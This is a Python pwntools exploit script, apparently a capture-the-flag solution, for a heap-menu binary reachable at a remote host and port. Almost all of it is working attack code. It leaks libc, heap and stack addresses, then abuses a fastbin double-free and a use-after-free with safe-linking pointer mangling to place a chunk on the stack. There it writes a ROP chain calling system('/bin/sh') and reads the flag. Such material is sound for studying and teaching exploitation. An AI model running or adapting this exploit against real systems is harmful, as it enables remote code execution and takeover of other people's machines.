#!/usr/bin/env python3

from pwn import *

TARGET = './main'
HOST = '103.185.52.103'
PORT = 5003

elf = ELF(TARGET)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
gdb_script = f"""
  b *main
"""
# context.log_level = 'DEBUG'

if not args.REMOTE:
  p = process(TARGET)
  # p = gdb.debug(TARGET, gdbscript=gdb_script)
else:
  p = remote(HOST, PORT)

# ===================================== #

'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    libc ver:   Ubuntu GLIBC 2.39-0ubuntu8.6
'''

def mangle(val, base):
  return val ^ (base >> 12)

def alloc(id: int, age: int, payload):
  p.sendlineafter(b'>> ', str(1).encode())
  p.sendlineafter(b'ID: ', str(id).encode())
  p.sendlineafter(b'Age: ', str(age).encode())
  p.sendlineafter(b'Name: ', payload)

def free(idx: int):
  p.sendlineafter(b'>> ', str(2).encode())
  p.sendlineafter(b'delete: ', str(idx).encode())

def list():  # leak
  p.sendlineafter(b'>> ', str(3).encode())

def edit(idx: int, id: int, age: int, payload):
  p.sendlineafter(b'>> ', str(4).encode())
  p.sendlineafter(b'edit: ', str(idx).encode())
  p.sendlineafter(b'ID: ', str(id).encode())
  p.sendlineafter(b'Age: ', str(age).encode())
  p.sendlineafter(b'Name: ', payload)

def exit():
  p.sendlineafter(b'>> ', str(5).encode())

# ===================================== #

# Leak libc and heap #
for i in range(8):
    alloc(0x67, 0x69, (f'temp{i}'.encode()))    # idx 0 - 7 (8 chunks)
for i in range(8, -1, -1):
    free(i)
p.sendlineafter(b'>> ', (str(3).encode() * 0x420))
list()
p.recvuntil(b'Index: 0, ID: ')
libc_leak = int(p.recvuntil(b',')[:-1])
libc.address = libc_leak - 0x203b30
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
environ = libc.sym.environ
print(f"libc base : {hex(libc.address)}")
print(f"system()  : {hex(system)}")
print(f"/bin/sh   : {hex(binsh)}")
print(f"environ   : {hex(environ)}")

ret = libc.address + 0x2882f
pop_rdi = libc.address + 0x10f78b

p.recvuntil(b'Index: 7, ID: ')
heap_base = int(p.recvuntil(b',')[:-1]) << 12
first_chunk = heap_base + 0x290
print(f"heap base : {hex(heap_base)}")
# ================== #


# leak stack address #
for i in range(8):
    alloc(0x67, 0x69, (f'foo{i}'.encode())) # idx 8 - 15
alloc(0x67, 0x69, p64(0xdeadf00d)) # idx 16 -- fastbin double
alloc(0x67, 0x69, p64(0xdeadf00d)) # idx 17 -- fastbin double
for i in range(8, 16):
    free(i)
free(16)
free(17)
free(16)

for i in range(7):
    alloc(0x67, 0x69, (f'foo{i}'.encode())) # idx 18 - 24
leak_environ = mangle(environ-0x18, heap_base+0x390)
alloc(leak_environ, 0x1337, b'A' * 8) # idx 25
alloc(0x1338, 0x1339, b'A' * 8) # idx 26 -- junk
alloc(0x1340, 0x1341, b'A' * 8) # idx 27 -- junk 
alloc(0x1342, 0x1343, b'A' * 8) # idx 28 -- leaked environ
list()
p.recvuntil(b'4931, Name: AAAAAAAA')
stack_leak = u64(p.recv(6).ljust(8, b'\x00'))
print(f"stack leak : {hex(stack_leak)}")
edit_variable = stack_leak - 0x148
print(f"edit variable @ stack : {hex(edit_variable)}")
# ================== #

# first ropchain payload #
for i in range(3):
    alloc(0xf1, 0xf2, p32(0xbabebabe)) # idx 29 - 31
for i in range(29, 32):
    free(i)
target = mangle(edit_variable, heap_base+0x410)
edit(30, target, 0xff, p64(0xffffffffeeeeeeee))
alloc(0xf3, 0xf4, p64(0xbabefade)) # idx 32 -- junk
alloc(0xf5, 0xf6, p64(0xbabefade)) # idx 33 -- junk
alloc(0x0, binsh, p64(system)) # idx 34 -- stack (edit variable)
# ====================== #


# second ropchain payload #
alloc(0xf7, 0xf8, p64(0xfadedead)) # idx 35
alloc(0xf9, 0xfa, p64(0xfadedead)) # idx 36
free(35)
free(36)
target2 = mangle(edit_variable-0x10, heap_base+0x460)
edit(36, target2, 0x1337, p64(0xdecababe))
alloc(0xfb, 0xfc, p64(0xdecababe)) # idx 37 -- junk
alloc(0xfefe, ret, p64(pop_rdi)) # idx 38 -- rop
# ======================= #

# SHELL!!
p.sendline(b'cat ./flag*')

p.interactive()

# NOTE:                                                                
# double-free (via fastbin)
# UAF (via edit_user)
# alloc on stack and overwrite the edit_used variable so we can alloc multiple times
# put ropchain on stack (pop rdi; ret -> binsh_addr -> system)
